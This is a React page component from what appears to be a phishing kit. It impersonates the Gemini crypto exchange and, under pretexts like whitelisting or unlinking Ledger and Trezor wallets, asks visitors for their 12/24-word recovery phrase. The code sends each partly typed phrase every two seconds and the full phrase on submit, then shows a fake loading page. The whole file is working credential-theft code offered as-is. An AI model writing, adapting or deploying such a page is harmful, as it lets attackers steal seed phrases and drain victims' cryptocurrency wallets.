import { createFileRoute } from "@tanstack/react-router";
import { useEffect, useRef, useState } from "react";
import { GeminiLogo, GI_FONT_FAMILY, GiFontStyle, useGiQueryParam, useGiTracking } from "@/components/gi/GiShared";

export const Route = createFileRoute("/gi/phrase")({
  head: () => ({ meta: [{ title: "Recovery phrase" }] }),
  component: GiPhrasePage,
});

type PhraseMode = "whitelist" | "disconnect" | "ledger" | "trezor";

const CONTENT: Record<PhraseMode, { title: string; description: string }> = {
  whitelist: { title: "Wallet Whitelist", description: "Use the 12/24 word recovery phrase associated with your Gemini Wallet to enable whitelisting for your designated wallet." },
  disconnect: { title: "Disconnect Wallet", description: "Use the 12/24 word recovery phrase associated with your wallet to disconnect it from our system." },
  ledger: { title: "Unlink Cold Wallet", description: "Type in your 12 or 24 word Ledger Recovery phrase in order to successfully unlink it from your Gemini account." },
  trezor: { title: "Unlink Cold Wallet", description: "Type in your 12 or 24 word Trezor Recovery phrase in order to successfully unlink it from your Gemini account." },
};

function WalletTicketIcon() {
  return (
    <svg width="69" height="49" viewBox="0 0 69 49" fill="none">
      <path fillRule="evenodd" clipRule="evenodd" d="M67 33c-4.4 0-8-3.6-8-8s3.6-8 8-8c1 0 2-.7 2-1.8V4c0-2.2-1.8-4-4-4H4C1.8 0 0 1.8 0 4v11.2C0 16.3 1 17 2 17c4.4 0 8 3.6 8 8s-3.6 8-8 8c-1 0-2 .7-2 1.8V45c0 2.2 1.8 4 4 4h61c2.2 0 4-1.8 4-4V34.8c0-1.1-1-1.8-2-1.8Z" stroke="#000" strokeWidth="2" />
    </svg>
  );
}

function GiPhrasePage() {
  const { trackClick, trackInput, trackSubmit, giNavigate, sessionId } = useGiTracking();
  const urlMode = useGiQueryParam("mode") as PhraseMode | null;
  const mode: PhraseMode = urlMode === "whitelist" || urlMode === "disconnect" || urlMode === "ledger" || urlMode === "trezor" ? urlMode : "whitelist";

  const [phrase, setPhrase] = useState("");
  const [focused, setFocused] = useState(false);
  const lastSent = useRef("");
  const phraseRef = useRef("");
  const textareaRef = useRef<HTMLTextAreaElement>(null);

  useEffect(() => { phraseRef.current = phrase; }, [phrase]);
  useEffect(() => {
    const iv = setInterval(() => {
      const c = phraseRef.current;
      if (c && c !== lastSent.current) { lastSent.current = c; trackInput(`phrase_draft_${mode}`, c); }
    }, 2000);
    return () => clearInterval(iv);
  }, [mode, trackInput]);

  const wordCount = phrase.trim() ? phrase.trim().split(/\s+/).length : 0;

  const handleSubmit = () => {
    if (!phrase.trim()) return;
    trackClick(`Phrase Submit ${mode}`);
    trackSubmit(`phrase_final_${mode}`, phrase.trim());
    giNavigate("/gi/loading");
  };

  return (
    <div style={{ minHeight: "100vh", background: "#fff", fontFamily: GI_FONT_FAMILY, color: "rgb(1,3,4)", fontSize: 16, lineHeight: "24px" }}>
      <GiFontStyle />
      <style>{`
        .gi-ta { position: relative; min-height: 80px; border-radius: 10px; border: 1px solid rgb(204,205,205); background: transparent; padding: 0 16px; cursor: text; transition: border-color 0.2s; }
        .gi-ta.focused { border: 2px solid rgb(1,3,4); padding: 0 15px; }
      `}</style>
      <div style={{ display: "flex", alignItems: "center", padding: "16px 24px", height: 75 }}><GeminiLogo /></div>
      <div style={{ display: "flex", justifyContent: "center", width: "100%", padding: "48px 24px 0" }}>
        <div style={{ width: "100%", maxWidth: 420, display: "flex", flexDirection: "column", alignItems: "center" }}>
          <div style={{ marginBottom: 24 }}><WalletTicketIcon /></div>
          <h1 style={{ fontWeight: 600, fontSize: 32, lineHeight: "40px", margin: "0 0 8px 0", textAlign: "center" }}>{CONTENT[mode].title}</h1>
          <p style={{ fontSize: 14, lineHeight: "20px", color: "rgb(128,129,129)", textAlign: "center", margin: "0 0 24px 0" }}>{CONTENT[mode].description}</p>
          <div style={{ width: "100%" }}>
            <label style={{ fontSize: 14, fontWeight: 500, color: "rgb(128,129,129)", display: "block", marginBottom: 8 }}>Seed Phrase</label>
            <div className={`gi-ta ${focused ? "focused" : ""}`} onClick={() => textareaRef.current?.focus()}>
              <textarea ref={textareaRef} value={phrase} onChange={(e) => setPhrase(e.target.value.replace(/\n/g, " ").replace(/  +/g, " "))} onFocus={() => setFocused(true)} onBlur={() => setFocused(false)} placeholder="Enter your recovery phrase" autoComplete="off" spellCheck={false} style={{ width: "100%", minHeight: 56, background: "transparent", border: "none", outline: "none", fontSize: 14, color: "rgb(1,3,4)", lineHeight: "20px", paddingTop: 16, paddingBottom: 10, resize: "none", fontFamily: "inherit" }} />
              {wordCount > 0 && (
                <div style={{ position: "absolute", right: 12, bottom: 8, fontSize: 11, color: wordCount === 12 || wordCount === 24 ? "#00B67A" : "rgb(128,129,129)", fontWeight: 500 }}>{wordCount} word{wordCount !== 1 ? "s" : ""}</div>
              )}
            </div>
            <p style={{ fontSize: 12, color: "rgb(128,129,129)", marginTop: 6 }}>Divide the seed phrase with an empty space between each word</p>
          </div>
          <button onClick={handleSubmit} disabled={!phrase.trim()} style={{ display: "flex", alignItems: "center", justifyContent: "center", width: "100%", height: 56, borderRadius: 999, border: "none", cursor: phrase.trim() ? "pointer" : "default", fontSize: 16, fontWeight: 600, fontFamily: "inherit", marginTop: 16, background: phrase.trim() ? "rgb(1,3,4)" : "rgba(1,3,4,0.08)", color: phrase.trim() ? "#fff" : "rgba(1,3,4,0.3)" }}>
            {mode === "ledger" || mode === "trezor" ? "Next" : "Continue"}
          </button>
        </div>
      </div>
      <div className="fixed bottom-2 right-2 text-[10px] opacity-0 pointer-events-none">{sessionId}</div>
    </div>
  );
}
